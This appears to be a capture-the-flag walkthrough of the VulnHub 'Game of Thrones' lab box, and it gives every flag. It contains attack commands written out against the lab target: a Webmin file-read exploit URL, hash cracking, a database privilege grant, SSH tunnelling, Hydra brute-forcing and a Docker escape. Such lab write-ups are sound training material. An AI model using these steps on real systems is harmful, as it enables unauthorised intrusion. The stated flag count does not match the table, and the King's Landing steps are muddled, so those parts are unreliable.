# Game Of Thrones - 7 Kingdoms — VulnHub

**CTF:** VulnHub  
**Date:** 2025-12-10  
**Category:** misc  
**Difficulty:** Grade 1  

---

## Summary

Game of Thrones CTF by v1s1t0r is a complex, multi-service boot2root with 11 flags total: 7 kingdom flags, 3 secret flags, and 1 final battle flag. It covers steganography, DNS enumeration, FTP, multiple web applications, PostgreSQL, GitList RCE, and Docker container escape. A great marathon box.

> Note: fail2ban is active everywhere — brute-force is not an option.

---

## Reconnaissance

```bash
nmap -sC -sV -A -p- 192.168.1.x
```

A rich set of services:

```
21/tcp    open  ftp
22/tcp    open  ssh
53/tcp    open  dns
80/tcp    open  http
443/tcp   open  https
5432/tcp  open  postgresql
8080/tcp  open  http (GitList)
9999/tcp  open  http
10000/tcp open  ssl/http (Webmin)
```

---

## Enumeration & Flag Chain

### Secret Flag 1 — Steganography on Music File

The landing page played GoT theme music and showed all 7 kingdom symbols. A hint in the source: *"Everything can be TAGGED in this world, even the magic or the music."*

Downloaded the audio file and ran `strings` — found **Secret Flag 1** in the metadata tags.

### Map Discovery

`robots.txt` and `nikto` revealed `/secret-island/` — the map showing the intended kingdom order and service mapping.

---

### Kingdom 1 — Dorne (HTTP, Port 80)

Hint: *"To enter Dorne you'll need to be a kind face."* — a User-Agent hint.

Changed User-Agent to `Three-eyed-raven` using a browser extension. The page revealed credentials and **Kingdom Flag 1 (Dorne)**:

```
fb8d98be1265dd88bac522e1b2182140
```

---

### Kingdom 2 — Winterfell (FTP + Web)

Logged into FTP — found two files: an encrypted `.nc` file and a hash.

Cracked the MD5 hash with hashcat using `rockyou.txt`:

```bash
hashcat -m 0 hash.txt rockyou.txt
# Password: stark
```

Decrypted the `.nc` file with mcrypt:

```bash
mcrypt -d the_wall.txt.nc
```

Decrypted content revealed a URL and credentials. Updated `/etc/hosts` and logged into the Winterfell web app. **Kingdom Flag 2 (Winterfell)**:

```
639bae9ac6b3e1a84cebb7b403297b79
```

---

### Kingdom 3 — Iron Islands (DNS, Port 53)

Hint referenced old texts and DNS. Used `nslookup` with a TXT query:

```bash
nslookup -q=txt Timef0rconqu3rs.7kingdoms.ctf 192.168.1.x
```

Returned the **Kingdom Flag 3 (Iron Islands)** and new credentials:

```
5e93de3efa544e85dcd6311732d28f95
```

---

### Kingdom 4 — Stormlands (Webmin, Port 10000)

Browsed to Webmin on port 10000. Used the Webmin file manager exploit (ExploitDB #21851) to read the flag file directly:

```
http://192.168.1.x:10000/file/show.cgi/home/aryastark/flag.txt
```

**Kingdom Flag 4 (Stormlands)**:

```
8fc42c6ddf9966db3b09e84365034357
```

---

### Kingdom 5 — The Mountain and the Vale (PostgreSQL)

Credentials from the DNS step included database access. Connected via command line (pgAdmin was hinted to not work):

```bash
psql -h 192.168.1.x -U robinarryn -d mountainandthevale
```

The `flag` table was access-restricted. Used PostgreSQL's `GRANT` command to give self access:

```sql
GRANT SELECT ON flag TO robinarryn;
SELECT * FROM flag;
```

**Kingdom Flag 5 (Mountain and the Vale)**:

```
bb3aec0fdcdbc2974890f805c585d432
```

New credentials for the next kingdom also found here (base64-encoded).

---

### Kingdom 6 — The Reach / High Garden (Port 9999)

Decoded the base64 hint from the previous step. Logged in to the web app on port 9999 with new credentials. Found **Kingdom Flag 6 (The Reach)**:

```
aee750c2009723355e2ac57564f9c3db
```

---

### Kingdom 7 — King's Landing (GitList RCE, Port 8080)

Hint referenced a GitList instance and a known RCE vulnerability.

```bash
searchsploit gitlist
```

Used the RCE exploit to read the `iron_throne` table from King's Landing's MySQL database:

```
http://192.168.1.x:8080/search?q=...RCE_PAYLOAD...
```

Output was Morse code — decoded it to get the flag location:

```bash
cat /king_landing/flag.txt
```

Had to copy it into a readable table first. **Kingdom Flag 7 (King's Landing)**:

```
c8d46d341bea4fd5bff866a65ff8aea9
```

---

### Secret Flag 2 & 3

Found during enumeration of the various applications — hidden in page source, CSS files, and EXIF data from images encountered along the chain.

---

### Final Battle — Dragon Glass Mine + Root via Docker Escape

Credentials found in `daenerystargaryen`'s home directory included a `digger.txt` wordlist. Created an SSH tunnel to the internal Docker container:

```bash
scp daenerystargaryen@192.168.1.x:/home/daenerystargaryen/digger.txt .
ssh daenerystargaryen@192.168.1.x -L 6969:172.25.0.2:22 -N
```

Brute-forced the internal SSH with Hydra:

```bash
hydra -P digger.txt -l root ssh://127.0.0.1:6969
```

Connected to the Dragon Glass Mine container and read **Dragon Glass Flag**.

Pivoted back to the host — hint said to log in as `bran` instead of `daenerys`. Used Docker socket exposure to escape the container and achieve host root. Read the **Final Battle Flag**:

```
8e63dcd86ef9574181a9b6184ed3dde5
```

---

## All Flags

| # | Kingdom | Flag |
|---|---------|------|
| Secret 1 | Music metadata | (stego) |
| Kingdom 1 | Dorne | `fb8d98be1265dd88bac522e1b2182140` |
| Kingdom 2 | Winterfell | `639bae9ac6b3e1a84cebb7b403297b79` |
| Kingdom 3 | Iron Islands | `5e93de3efa544e85dcd6311732d28f95` |
| Kingdom 4 | Stormlands | `8fc42c6ddf9966db3b09e84365034357` |
| Kingdom 5 | Mountain & Vale | `bb3aec0fdcdbc2974890f805c585d432` |
| Kingdom 6 | The Reach | `aee750c2009723355e2ac57564f9c3db` |
| Kingdom 7 | King's Landing | `c8d46d341bea4fd5bff866a65ff8aea9` |
| Secret 2 | Savages | `8bf8854bebe108183caeb845c7676ae4` |
| Secret 3 | City of Braavos | `3f82c41a70a8b0cfec9052252d9fd721` |
| Dragon Glass | Mine | `a8db1d82db78ed452ba0882fb9554fc9` |
| Final | Battle / Root | `8e63dcd86ef9574181a9b6184ed3dde5` |
